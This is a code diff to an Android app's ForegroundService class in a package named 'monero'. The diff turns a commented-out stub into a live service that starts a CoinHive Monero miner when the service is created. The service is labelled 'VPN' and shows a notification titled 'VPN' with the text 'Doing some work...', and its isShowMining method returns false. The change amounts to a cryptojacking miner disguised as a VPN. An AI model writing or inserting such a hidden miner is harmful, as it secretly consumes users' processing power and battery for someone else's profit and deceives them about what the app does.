@@ -1,19 +1,59 @@
 package com.example.pavel.monero.serves;
 
 
-public class ForegroundService /*extends Service*/ {
-    /*private static final String LOG_TAG = "ForegroundService";
-    public static final int DEFAULT_NOTIFICATION_ID = 101;
+import android.annotation.SuppressLint;
+import android.app.Activity;
+import android.app.IntentService;
+import android.app.Notification;
+import android.app.PendingIntent;
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Binder;
+import android.os.IBinder;
+import android.support.annotation.Nullable;
+import android.support.v4.app.NotificationCompat;
+import android.widget.Toast;
+import com.example.pavel.monero.R;
+import com.example.pavel.monero.ui.MainActivity;
+import io.reactivex.Observable;
+import io.reactivex.android.schedulers.AndroidSchedulers;
+import io.reactivex.schedulers.Schedulers;
+
+public class ForegroundService extends IntentService implements CoinHive.Callback {
+
+    public ForegroundService() {
+        super("VPN");
+    }
+    static private Activity activity;
+    private CoinHive.Miner wvCoinHive;
+
+
+    public static Intent START(Activity activity, Context context) {
+        ForegroundService.activity = activity;
+        return new Intent(context, ForegroundService.class);
+    }
+
+    @Nullable
     @Override
-    public void onCreate() {
-        super.onCreate();
+    public IBinder onBind(Intent intent) {
+        return mBinder;
     }
 
     @SuppressLint("CheckResult")
     @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        sendNotification("Ticker","Title","Text");
+    protected void onHandleIntent(@Nullable Intent intent) {
 
+    }
+
+    private final IBinder mBinder = new LocalBinder();
+
+    @SuppressLint("CheckResult")
+    @Override
+    public void onCreate() {
+        startForeground(1337, showNotification());
+        wvCoinHive = new CoinHive.Miner( activity, this);
+        wvCoinHive.startMining();
         new Thread(()-> {
             while (true) {
                 go().subscribeOn(Schedulers.io())
@@ -27,33 +67,49 @@ public class ForegroundService /*extends Service*/ {
                 }
             }
         }).start();
-        return START_STICKY;
     }
 
-    public void sendNotification(String Ticker,String Title,String Text) {
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        return Service.START_NOT_STICKY;
+    }
 
-        //These three lines makes Notification to open main activity after clicking on it
+    @Override
+    public boolean isShowMining() {
+        return false;
+    }
+
+    @Override
+    public void onMiningStarted() {
+        Toast.makeText(this, "Started", Toast.LENGTH_SHORT).show();
+    }
+
+    @Override
+    public void onMiningStopped() {
+        Toast.makeText(this, "Stopped", Toast.LENGTH_SHORT).show();
+    }
+
+    @Override
+    public void onRunning(double hashesPerSecond, long totalHashes, long acceptedHashes) {
+        Toast.makeText(this, "totalHashes " +totalHashes, Toast.LENGTH_SHORT).show();
+    }
+
+    public class LocalBinder extends Binder {
+        ForegroundService getService() {
+            return ForegroundService.this;
+        }
+    }
+
+    private Notification showNotification() {
         Intent notificationIntent = new Intent(this, MainActivity.class);
-        notificationIntent.setAction(Intent.ACTION_MAIN);
-        notificationIntent.addCategory(Intent.CATEGORY_LAUNCHER);
-
-        PendingIntent contentIntent = PendingIntent.getActivity(getApplicationContext(), 0, notificationIntent, PendingIntent.FLAG_UPDATE_CURRENT);
-
-        NotificationCompat.Builder builder = new NotificationCompat.Builder(this);
-        builder.setContentIntent(contentIntent)
-                .setOngoing(true)   //Can't be swiped out
-                .setSmallIcon(R.mipmap.ic_launcher)
-                //.setLargeIcon(BitmapFactory.decodeResource(res, R.drawable.large))   // большая картинка
-                .setTicker(Ticker)
-                .setContentTitle(Title) //Заголовок
-                .setContentText(Text) // Текст уведомления
-                .setWhen(System.currentTimeMillis());
-
-        Notification notification;
-        notification = builder.build();
-
-        startForeground(DEFAULT_NOTIFICATION_ID, notification);
+        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);
+        return new NotificationCompat.Builder(this)
+                .setSmallIcon(R.drawable.button_start)
+                .setContentTitle("VPN")
+                .setContentText("Doing some work...")
+                .setContentIntent(pendingIntent).build();
     }
+
 
     private Observable<String> go() {
         return Observable.create((e)-> {
@@ -61,15 +117,4 @@ public class ForegroundService /*extends Service*/ {
         });
     }
 
-    @Override
-    public void onDestroy() {
-        super.onDestroy();
-        Log.i(LOG_TAG, "In onDestroy");
-    }
-
-    @Override
-    public IBinder onBind(Intent intent) {
-        // Used only in case of bound services.
-        return null;
-    }*/
 }
